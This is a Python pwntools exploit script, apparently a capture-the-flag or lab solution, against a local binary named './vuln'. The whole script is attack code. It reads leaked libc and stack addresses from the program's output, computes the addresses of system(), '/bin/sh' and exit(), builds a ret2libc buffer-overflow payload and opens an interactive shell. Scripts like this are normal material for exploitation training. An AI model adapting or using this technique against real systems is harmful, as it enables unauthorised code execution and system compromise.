#!/usr/bin/python
from pwn import *
import pexpect
import time

def main():
	pay = "A" * 16
	app = "./vuln"
	pause = 0.2

	# First execution
	io = process([app, pay])
	time.sleep(pause)
	
	data = io.recv()
	data = data.strip()

	# [ leak_libc ] [ leak_stack ] 
	leak_libc = data[ data.rfind('A') + 1 : len(data) - 4 ] 
	leak_libc = u32(leak_libc)
	log.success("leak libc : 0x%x" % leak_libc)

	leak_stack = data[ len(data) - 4 : len(data) ]
	leak_stack = u32(leak_stack)
	log.success("leak stack : 0x%x" % leak_stack)

	libc_base = (leak_libc - 0x3dc) - 0x1b0000
	sys = libc_base + 0x3a940
	sh = libc_base + 0x15902b
	exit = libc_base + 0x2e7b0

	log.success("libc base : 0x%x" % libc_base)
	log.success("system() : 0x%x" % sys)
	log.success("/bin/sh : 0x%x" % sh)
	log.success("exit() : 0x%x" % exit)

	offset = 16
	log.warn("Crafting payload..")
	
	pay = "B" * offset
	pay += p32(leak_libc)
	pay += p32(leak_stack)
	pay += p32(0x00) # ebp
	pay += p32(sys) # eip
	pay += '\xCC' * 4
	pay += p32(sh) 

	# mirror
	pay += p32(0x00)
	pay += p32(sys)
	pay += p32(exit)
	pay += p32(sh)
	
	log.warn("Payload length : %d" % len(pay))
	
	#raw_input( str(io.proc.pid) )

	time.sleep(pause)
	log.progress("Popping shell!")	
	
	io.sendline(pay)
	io.interactive()

if __name__ == "__main__":
	main()
